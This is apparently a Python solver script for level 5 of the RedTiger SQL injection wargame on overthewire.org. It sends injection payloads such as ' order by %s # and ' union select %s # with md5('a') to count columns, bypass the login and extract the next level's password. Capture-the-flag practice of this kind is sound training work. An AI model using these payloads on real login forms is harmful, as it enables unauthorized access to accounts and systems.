#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies
from connect import my_request as req


def main():
    '''
    Target: Bypass the login

    Disabled: substring , substr, ( , ), mid
    Hints: its not a blind, the password is md5-crypted, watch the login errors
    '''
    url = "https://redtiger.labs.overthewire.org/level5.php"
    finds = "md5('a')"
    url_param = '?mode=login'
    pass_r = 'The password for the next level is: '
    level = 'level5login'

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level5login=cooks[level])

    # Counting the number of columns
    data = dict(username=f"' order by %s #", password='a', login='Login')
    if not (columns := tg.count_columns(url + url_param, data, cook, method='post')):
        return False

    # Try to auth
    data = dict(
        username="' union select %s #", password='a', login='Login')
    if not (response := tg.try_auth(url + url_param, columns, data, finds, cook)):
        return False

    # Еxtracting data from html
    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
    print('password:', passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()





